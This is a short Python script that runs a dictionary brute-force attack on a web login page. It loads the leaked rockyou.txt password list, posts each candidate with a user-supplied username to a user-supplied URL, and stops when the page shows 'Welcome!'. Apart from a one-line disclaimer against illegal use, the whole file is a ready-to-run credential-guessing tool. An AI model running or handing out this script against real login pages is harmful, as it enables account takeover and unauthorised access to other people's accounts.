# DISCLAIMER: DO NOT USE FOR ILLEGAL PURPOSES
import requests
import bz2

# the .bz2 file of rockyou.txt can be found at https://wiki.skullsecurity.org/Passwords
arg = bz2.open('../passwords/rockyou.txt.bz2', 'r')
url = input("Enter the URL of the login page (include 'http(s)://'):\n")
username = input("Enter the username:\n")

i = 0
for line in arg:
    password = line.strip().decode("utf-8")
    http = requests.post(url, data={'input1': username, 'input2': password, 'sub': 'submit'})
    i += 1
    content = str(http.content)
    if "Welcome!" in content:
        print("PASSWORD FOUND: " + password)
        print(str(i) + " GUESSES")
        break
    else:
        print("INVALID PASSWORD: " + password)
